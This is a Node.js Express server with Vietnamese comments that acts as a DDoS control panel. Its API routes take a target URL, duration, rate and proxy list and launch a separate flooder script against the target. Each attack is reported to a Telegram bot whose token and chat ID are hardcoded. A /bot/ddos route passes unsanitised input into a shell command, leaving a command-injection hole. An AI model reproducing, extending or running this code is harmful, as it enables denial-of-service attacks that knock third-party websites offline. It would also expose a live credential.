const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const axios = require('axios');

const urlRegex = /^(https?|ftp):\/\/[^\s/$.?#].[^\s]*$/;
const blackList = ['\'', '"', '[', ']', '{', '}', '(', ')', ';', '|', '&', '%', '#', '@'];

const api_port = 4000; // Cổng API
const api_key = "quangdev"; // Khóa API của bạn

const bot_token = "8152527907:AAFjtXCIPYHTErd9r8us8ScyvCydeL8y6nM"; // Token của bot Telegram
const chat_id = "-1002390662783"; // Chat ID Telegram của bạn

const app = express();
app.use(express.json());

// Hàm gửi thông báo tới Telegram
const sendTelegramMessage = async (message) => {
    const url = `https://api.telegram.org/bot${bot_token}/sendMessage`;
    try {
        await axios.post(url, { chat_id, text: message, parse_mode: "Markdown" });
    } catch (error) {
        console.error("Lỗi khi gửi tin nhắn Telegram:", error.message);
    }
};

app.get(`/api`, async (req, res) => {
    const field = {
        url: req.query.url || undefined,
        time: req.query.time || undefined,
        rate: req.query.rate || undefined,
        thea: req.query.thea || undefined,
        proxy: req.query.proxy || undefined,
        api_key: req.query.api_key || undefined,
    };

    // Kiểm tra API key
    if (field.api_key !== api_key) return res.json({ status: 500, data: `Khóa API không hợp lệ` });

    // Kiểm tra các trường đầu vào
    const containsBlacklisted = blackList.some(char => field.url.includes(char));
    if (!field.url || !urlRegex.test(field.url) || containsBlacklisted) return res.json({ status: 500, data: `URL không hợp lệ` });
    if (!field.time || isNaN(field.time) || field.time > 86400) return res.json({ status: 500, data: `Thời gian cần phải là một số trong khoảng 0-86400` });
    if (!field.rate || isNaN(field.rate)) return res.json({ status: 500, data: `Rate không hợp lệ` });
    if (!field.thea || isNaN(field.thea)) return res.json({ status: 500, data: `Thea không hợp lệ` });
    if (!field.proxy) return res.json({ status: 500, data: `Proxy không được để trống` });

    // Chuẩn bị lệnh gọi tệp flooder.js
    const command = `node flooder.js ${field.url} ${field.time} ${field.rate} ${field.thea} ${field.proxy}`;

    // Log thông tin ra console
    console.log(`URL: ${field.url} Time: ${field.time} Rate: ${field.rate} Threading: ${field.thea} đang thực hiện Start attack`);

    // Gửi phản hồi trạng thái ban đầu ngay lập tức
    res.json({
        status: 200,
        message: 'Yêu cầu đã được nhận, đang xử lý',
        data: {
            url: field.url,
            time: field.time,
            rate: field.rate,
            thea: field.thea,
            proxy: field.proxy,
        }
    });

    // Gửi thông báo tới Telegram
    const telegramMessage = `*𝑨𝒕𝒕𝒂𝒄𝒌 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑺𝒆𝒏𝒕*\n
🌐 *Host*: ${field.url}\n
🔌 *Port*: 443\n
⏰ *Time*: ${field.time} giây\n
🛠️ *Method*: Custom\n
🖥️ *Server*: 1/2\n
🔁 *Concurrent*: ${field.thea}/${field.rate}\n
🏆 *User*: API\n
🕒 *Thời gian*: ${new Date().toLocaleString()}`;
    sendTelegramMessage(telegramMessage);

    // Thực thi lệnh sau khi gửi phản hồi
    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.error(`Lỗi: ${stderr}`);
            return;
        }

        console.log(`Gửi yêu cầu thành công: ${stdout}`);
    });
});

// Thêm route tải proxy tự động
app.get('/proxy', async (req, res) => {
    const proxyUrl = "https://sunny9577.github.io/proxy-scraper/proxies.txt";
    try {
        const response = await axios.get(proxyUrl);
        fs.writeFileSync('proxies.txt', response.data);
        console.log(`Đã tải và lưu proxy vào tệp proxies.txt`);

        // Gửi thông báo Telegram khi tải proxy thành công
        sendTelegramMessage(`*Proxy cập nhật thành công!*`);
        return res.json({ status: 200, message: "Đã tải proxy thành công" });
    } catch (error) {
        console.error(`Lỗi khi tải proxy: ${error.message}`);
        return res.json({ status: 500, message: "Lỗi khi tải proxy" });
    }
});

// Lệnh chạy DDoS thông qua Telegram bot
app.get('/bot/ddos', async (req, res) => {
    const { url, time } = req.query;

    if (!url || !urlRegex.test(url) || !time || isNaN(time)) {
        return res.json({ status: 400, message: "Tham số không hợp lệ. Dùng: /ddos <url> <time>" });
    }

    const command = `node flooder.js ${url} ${time} 10 10 proxies.txt`;

    console.log(`Bot đang thực hiện DDoS URL: ${url} với thời gian: ${time} giây`);

    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.error(`Bot lỗi khi thực hiện: ${stderr}`);
            return res.json({ status: 500, message: "Thực thi thất bại" });
        }

        sendTelegramMessage(`*Bot đã thực hiện thành công DDoS!*\n\n🌐 *Host*: ${url}\n⏰ *Time*: ${time} giây`);
        return res.json({ status: 200, message: "DDoS thành công!" });
    });
});

app.listen(api_port, () => console.log(`API đã chạy trên cổng ${api_port}`));
